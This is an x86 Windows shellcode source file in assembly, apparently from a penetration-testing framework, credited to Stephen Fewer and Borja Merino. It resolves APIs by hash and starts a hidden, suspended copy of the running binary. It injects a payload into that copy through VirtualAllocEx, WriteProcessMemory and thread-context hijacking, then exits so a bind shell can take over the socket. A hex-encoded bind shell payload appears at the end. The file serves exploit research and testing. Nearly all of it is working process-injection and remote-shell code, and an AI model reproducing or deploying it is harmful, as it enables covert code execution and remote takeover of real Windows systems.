; Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com) API hash algorithm
; Borja Merino (bmerinofe@gmail.com): Migrate + Rebind socket

[BITS 32]
[ORG 0]
  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
api_call:
  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp           ; Create a new stack frame
  xor eax, eax           ; Zero EAX (upper 3 bytes will remain zero until function is found)
  mov edx, [fs:eax+48]   ; Get a pointer to the PEB
  mov edx, [edx+12]      ; Get PEB->Ldr
  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:                ;
  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
  xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
  lodsb                  ; Read in the next byte of the name
  cmp al, 'a'            ; Some versions of Windows use lower case module names
  jl not_lowercase       ;
  sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  loop loop_modname      ; Loop until we have read enough

  ; We now have the module hash computed
  push edx               ; Save the current position in the module list for later
  push edi               ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+16]      ; Get this modules base address
  mov ecx, [edx+60]      ; Get PE header

  ; use ecx as our EAT pointer here so we can take advantage of jecxz.
  mov ecx, [ecx+edx+120] ; Get the EAT from the PE header
  jecxz get_next_mod1    ; If no EAT present, process the next module
  add ecx, edx           ; Add the modules base address
  push ecx               ; Save the current modules EAT
  mov ebx, [ecx+32]      ; Get the rva of the function names
  add ebx, edx           ; Add the modules base address
  mov ecx, [ecx+24]      ; Get the number of function names
  ; now ecx returns to its regularly scheduled counter duties
  ; Computing the module hash + function hash
get_next_func:           ;
  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                ; Decrement the function name counter
  mov esi, [ebx+ecx*4]   ; Get rva of next module name
  add esi, edx           ; Add the modules base address
  xor edi, edi           ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:           ;
  lodsb                  ; Read in the next byte of the ASCII function name
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname      ; If we have not reached the null terminator, continue
  add edi, [ebp-8]       ; Add the current module hash to the function hash
  cmp edi, [ebp+36]      ; Compare the hash to the one we are searching for
  jnz get_next_func      ; Go compute the next function hash if we have not found it

  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                ; Restore the current modules EAT
  mov ebx, [eax+36]      ; Get the ordinal table rva
  add ebx, edx           ; Add the modules base address
  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
  mov ebx, [eax+28]      ; Get the function addresses table rva
  add ebx, edx           ; Add the modules base address
  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
  add eax, edx           ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                ; Clear off the current modules hash
  pop ebx                ; Clear off the current position in the module list
  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                ; Pop off the origional return address our caller will have pushed
  pop edx                ; Pop off the hash value our caller will have pushed
  push ecx               ; Push back the correct return value
  jmp eax                ; Jump into the required function
  ; We now automagically return to the correct caller...

get_next_mod:            ;
  pop edi                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
  pop edi                ; Pop off the current (now the previous) modules hash
  pop edx                ; Restore our position in the module list
  mov edx, [edx]         ; Get the next module
  jmp short next_mod     ; Process this module
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );

  mov eax, [fs:0x30]        ; PEB
  mov eax, [ds:eax+0x10]    ; _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
  mov esi, [ds:eax+0x74]    ; Path Binary
  add esp,-400              ; adjust the stack to avoid corruption
  lea edx,[esp+0x60]
  push edx
  push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
  call ebp                  ; GetStartupInfoA( &si );
  lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
  mov [eax+0x4], ecx		; Clean lpReserved (change me)
  mov [eax+0x8], ecx		; Clean lpDesktop (change me)
  mov [eax+0xC], ecx		; Clean lpTitle (change me)
  lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
  push edi                  ; lpProcessInformation : write processinfo here
  push eax                  ; lpStartupInfo : current info (read)
  xor ebx,ebx
  push ebx                  ; lpCurrentDirectory
  push ebx                  ; lpEnvironment
  push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
  push ebx                  ; bInHeritHandles
  push ebx                  ; lpThreadAttributes
  push ebx                  ; lpProcessAttributes
  push esi                  ; lpCommandLine
  push ebx                  ; lpApplicationName
  push 0x86EFCC79           ; hash( "kernel32.dll", "CreateProcessW" )
  call ebp                  ; CreateProcessW( &si );
  ; if we didn't get a new process, use this one
  test eax,eax
  jz payload                ; If process creation failed, jump to shellcode
  push 0x40                 ; RWX
  add bh, 0x10              ; ebx = 0x1000
  push ebx                  ; MEM_COMMIT
  mov ebx, 0x253   		    ; Bufer size
  push ebx                  
  xor ebx,ebx
  push ebx                  ; address
  push dword [edi]          ; handle
  push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
  call ebp                  ; VirtualAllocEx( ...);
  ; eax now contains the destination

  push esp                  ; lpNumberOfBytesWritten
  push 0x253        		; nSize                                  
  ; pick up pointer to shellcode & keep it on stack
  jmp begin_of_payload
  begin_of_payload_return:  ; lpBuffer
  push eax                  ; lpBaseAddress
  XCHG eax, esi				; record base address
  push dword [edi]          ; hProcess
  push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
  call ebp                  ; WriteProcessMemory( ...)
  ; Let's Thread Hijack
  mov ebx, dword [edi+0x4]
  push 0x10001
  push esp					; lpContext
  push ebx        			; hThread
  push 0xD1425C18           ; hash( "kernel32.dll", "GetThreadContext" ) 
  call ebp                  ; GetThreadContext( ...);
  mov dword [esp+0xB8], esi ; Change EIP Context 
  push esp					; lpContext
  push ebx					; hThread
  push 0xD14E5C18			; hash( "kernel32.dll", "SetThreadContext" ) 
  call ebp
  push ebx					; hThread
  push 0x8EF4092B			; hash( "kernel32.dll", "ResumeThread" ) 
  call ebp
  ; End the current process to release socket
  push 0					
  push 0x3FE257E1           ; ExitProcess(0)
  call ebp
begin_of_payload:
  call begin_of_payload_return
payload:
; Add here your bind shell: In the P0c I've used a standard bind shell adding a sleep of 3 seconds: https://github.com/BorjaMerino/stuff/blob/master/bind_sleep_tcp.rb 
;fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd568b80b00006844f035e0ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200350b89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c675eec3
